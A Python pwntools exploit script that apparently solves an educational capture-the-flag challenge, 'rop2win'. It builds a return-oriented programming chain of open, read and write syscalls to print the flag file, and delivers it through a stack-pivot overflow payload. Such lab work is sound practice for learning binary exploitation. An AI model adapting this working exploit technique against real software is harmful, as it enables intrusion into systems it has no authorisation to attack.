from pwn import *

HOST, PORT = 'edu-ctf.zoolab.org', 30204
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./Rop2win/share/rop2win')
rop = ROP(exe)

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    env = {}
    io = process(exe.path)
    pause()

addr = exe.bss() - 0x50

# rbp
rop.raw(exe.sym.ROP + 0x80)
# open
rop({
    'rax': 2,
    'rdi': exe.sym.fn,
    'rsi': 0,
    'rdx': 0
})
rop.raw(rop.find_gadget(['syscall', 'ret']).address)
# read
rop.read(3, addr, 0x20)
# write
rop.write(1, addr, 0x20)
# exit
rop.exit(0)

# print(rop.dump())

payload = flat({ 0x20: [
    exe.sym.ROP,
    rop.leave.address,
]})

io.sendlineafter(b'filename:', b'/home/rop2win/flag\0')
io.sendlineafter(b'ROP:', rop.chain())
io.sendlineafter(b'overflow:', payload)

# io.interactive()

flag = io.readuntil(b'}').strip().decode()
success(flag)
